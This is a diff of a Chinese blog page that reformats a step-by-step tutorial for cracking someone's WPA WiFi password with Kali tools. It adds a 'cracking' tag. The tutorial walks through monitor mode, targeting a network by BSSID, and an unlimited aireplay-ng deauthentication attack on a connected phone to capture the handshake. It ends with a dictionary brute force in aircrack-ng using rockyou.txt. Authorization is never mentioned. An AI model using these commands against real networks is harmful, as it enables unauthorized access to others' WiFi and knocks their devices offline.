@@ -439,6 +439,10 @@
                                 <span class="chip bg-color">wifi</span>
                             </a>
                         
+                            <a href="/tags/%E7%A0%B4%E8%A7%A3/">
+                                <span class="chip bg-color">破解</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -474,7 +478,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    584
+                    591
                 </div>
                 
 
@@ -503,15 +507,26 @@
 <img src="/2020/12/17/kali-wu-xian-xiang-guan/3.jpg" alt="info"></li>
 </ul>
 <hr>
-<h4 id="使用airmon-ng"><a href="#使用airmon-ng" class="headerlink" title="使用airmon-ng"></a>使用airmon-ng</h4><pre class="language-bash" data-language="bash"><code class="language-bash">airmon-ng start wlan0</code></pre>
+<h4 id="使用airmon-ng"><a href="#使用airmon-ng" class="headerlink" title="使用airmon-ng"></a>使用airmon-ng</h4><ul>
+<li><p>验证无线网卡</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">airmon-ng start wlan0</code></pre>
 <p><img src="/2020/12/17/kali-wu-xian-xiang-guan/4.jpg" alt="info"></p>
-<p>输入iwconfig命令查看网卡信息， wlan0mon网卡名加了mon则表示成功<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/5.jpg" alt="info"></p>
-<p>命令airodump-ng wlan0mon，开始扫描WiFi，按ctrl+c结束任务<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/6.jpg" alt="info"><br>BSSID为wifi的MAC地址，PWR为信号强弱程度，数值越小信号越强；#DATA为数据量，越大使用的人就越多，CH为信道频率（频道），ESSID为wifi的名称，中文可能会有乱码</p>
-<p>接着输入airodump-ng –bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon<br>如：airodump-ng –bssid BC:5F:6F:3D:03:74 -c 13 -w /home/wifi wlan0mon<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/7.jpg" alt="info"><br>数据包已经正在抓取<br>如果抓取不到数据，新建一个终端：键入airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon）<br>如：aireplay-ng -0 0 -c B8:37:65:94:5D:13 -a BC:5F:6F:3D:03:74 wlan0mon<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/8.jpg" alt="info"><br>(0 WiFi设备无限次数,-0 8则攻击8次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码,<br>数据包里面的密码是哈希加密的，哈希加密只能正向)</p>
-<p>出现WPA handshake时，表示抓包成功<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/9.jpg" alt="info"></p>
-<p>两个终端都按Ctrl+c停止，不然那边会一直断网的<br>cd打开抓包的目录，ls列出来，就看到我们抓到的数据包<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/10.jpg" alt="info"></p>
-<p>解压kali自带的字典文件 路径：/usr/share/wordlists/rockyou.txt.gz<br>如 ：gzip -d/usr/share/wordlists/rockyou.txt.gz</p>
-<p>键入 aircrack-ng -w 字典路径 握手包路径，回车后开始爆破<br>如：aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi-0.1.cap<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/11.jpg" alt="info"></p>
+</li>
+<li><p>输入iwconfig命令查看网卡信息， wlan0mon网卡名加了mon则表示成功<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/5.jpg" alt="info"></p>
+</li>
+<li><p>命令airodump-ng wlan0mon，开始扫描WiFi，按ctrl+c结束任务<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/6.jpg" alt="info"><br>BSSID为wifi的MAC地址，PWR为信号强弱程度，数值越小信号越强；#DATA为数据量，越大使用的人就越多，CH为信道频率（频道），ESSID为wifi的名称，中文可能会有乱码</p>
+</li>
+<li><p>接着输入airodump-ng –bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon<br>如：airodump-ng –bssid BC:5F:6F:3D:03:74 -c 13 -w /home/wifi wlan0mon<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/7.jpg" alt="info"><br>数据包已经正在抓取</p>
+</li>
+<li><p>如果抓取不到数据，新建一个终端：键入airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon）<br>如：aireplay-ng -0 0 -c B8:37:65:94:5D:13 -a BC:5F:6F:3D:03:74 wlan0mon<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/8.jpg" alt="info"><br>(0 WiFi设备无限次数,-0 8则攻击8次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码,<br>数据包里面的密码是哈希加密的，哈希加密只能正向)<br>出现WPA handshake时，表示抓包成功<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/9.jpg" alt="info"></p>
+</li>
+<li><p>两个终端都按Ctrl+c停止，不然那边会一直断网的<br>cd打开抓包的目录，ls列出来，就看到我们抓到的数据包<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/10.jpg" alt="info"></p>
+</li>
+<li><p>解压kali自带的字典文件 路径：/usr/share/wordlists/rockyou.txt.gz<br>如 ：gzip -d/usr/share/wordlists/rockyou.txt.gz</p>
+</li>
+<li><p>键入 aircrack-ng -w 字典路径 握手包路径，回车后开始爆破<br>如：aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi-0.1.cap<br><img src="/2020/12/17/kali-wu-xian-xiang-guan/11.jpg" alt="info"></p>
+</li>
+</ul>
 <p>耐心等待密码破解吧…</p>
 <p>特别说明：暴力破解并不简单，需要足够强大的字典和时间，可以通过字典生成工具生成自己的字典，字典越强大越容易破解。。哈哈，也是需要点运气的！</p>
 
@@ -589,6 +604,10 @@
                             
                                 <a href="/tags/wifi/">
                                     <span class="chip bg-color">wifi</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%A0%B4%E8%A7%A3/">
+                                    <span class="chip bg-color">破解</span>
                                 </a>
                             
                         </div>
@@ -805,6 +824,10 @@
                     
                     <a href="/tags/wifi/">
                         <span class="chip bg-color">wifi</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%A0%B4%E8%A7%A3/">
+                        <span class="chip bg-color">破解</span>
                     </a>
                     
                 </div>
